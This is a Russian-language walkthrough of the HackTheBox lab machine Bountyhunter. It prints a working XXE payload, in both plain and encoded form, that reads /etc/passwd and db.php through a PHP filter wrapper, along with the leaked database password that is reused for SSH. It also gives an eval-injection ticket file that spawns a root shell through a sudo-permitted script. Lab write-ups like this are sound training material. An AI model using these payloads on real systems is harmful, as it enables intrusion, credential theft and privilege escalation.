# Bountyhunter (2022)

<figure><img src="../../../.gitbook/assets/1 (2).png" alt=""><figcaption></figcaption></figure>

## Ключевые моменты прохождения:

✅ Эксплуатируем `XXE` и открываем `php` файл через `php wrapper` на атакуемой машине\
✅ Повышаем привилегии через кастомный скрипт, который можно запускать с привилегиями рут

## Разведка

```bash
$ nmap -sC -sV 10.10.11.100
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
$ gobuster dir -u http://10.10.11.100/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php -t 40
```

```
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]   
/portal.php           (Status: 200) [Size: 125]                                     
/index.php            (Status: 200) [Size: 25169]                                   
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]      
/db.php               (Status: 200) [Size: 0]                                       
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
```

К db.php доступ ограничен. То есть его можно прочитать только на локалхосте. На / нету ничего интересного, форма не работает:&#x20;

<figure><img src="../../../.gitbook/assets/2 (2).png" alt=""><figcaption></figcaption></figure>

На portal.php есть ссылка на форму с Bounty Report System:&#x20;

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

Тут есть 4 поля ввода:

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

&#x20;Форма рабочая и можно перехватить запрос в BurpSuite:&#x20;

<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

Если расшифровать в URL, а потом расшифровать в base64, то получим XML:&#x20;

<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

## Получаем юзера

Итак, чтобы правильно передать XML нужно сначала расшифровать в URL, а потом в Base64, отредактировать, и проделать те же действия только с шифрованием. Смотрим /etc/passwd: &#x20;

<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Кроме рута, есть пользователь development, это в дальнейшем понадобится. Получить db.php по дефолтному пути(/var/www/html/) не получится напрямую, так как это PHP и он не отображается в браузере. Получится только через враппер php:&#x20;

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

```xml
data=<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
		<bugreport>
		<title>13</title>
		<cwe>123</cwe>
		<cvss>132</cvss>
		<reward>&file;</reward>
		</bugreport>
```

Вот сам пэйлоад:

```
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4NCjwhRE9DVFlQRSBkYXRhIFs8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI%2bIF0%2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bMTM8L3RpdGxlPgoJCTxjd2U%2bMTIzPC9jd2U%2bCgkJPGN2c3M%2bMTMyPC9jdnNzPgoJCTxyZXdhcmQ%2bJmZpbGU7PC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b
```

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test"
```

Получив креды, можно вместо базы данных попробовать их для ssh:

```console
$ ssh development@10.10.11.100
```

<figure><img src="../../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

## Получаем рута

```console
$ sudo -l
```

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

&#x20;От рута мы можем запускать только скрипт ticketValidator.py:

<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

&#x20;Коротко говоря, что должно быть в файле:

1. Файл должен быть с расширением .md
2. В самом начале файла должна быть строка # Skytrain Inc
3. Вторая строка должна быть ## Ticket to <любое значение, например, world>
4. Третья строка должна быть **Ticket Code:**
5. Четвертая строка должна начинаться с \*\* , а также после этого должно быть число, которое при делении на 7 выдаст остаток 4, например, 18, 25, 32.
6. И потом через знак + нужно вставить пэйлоад, так как в скрипте происходит небезопасное использование функции eval().&#x20;

```python
# Skytrain Inc
## Ticket to world
__Ticket Code:__
**18+exec("__import__('os').system('/bin/bash')")
```

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
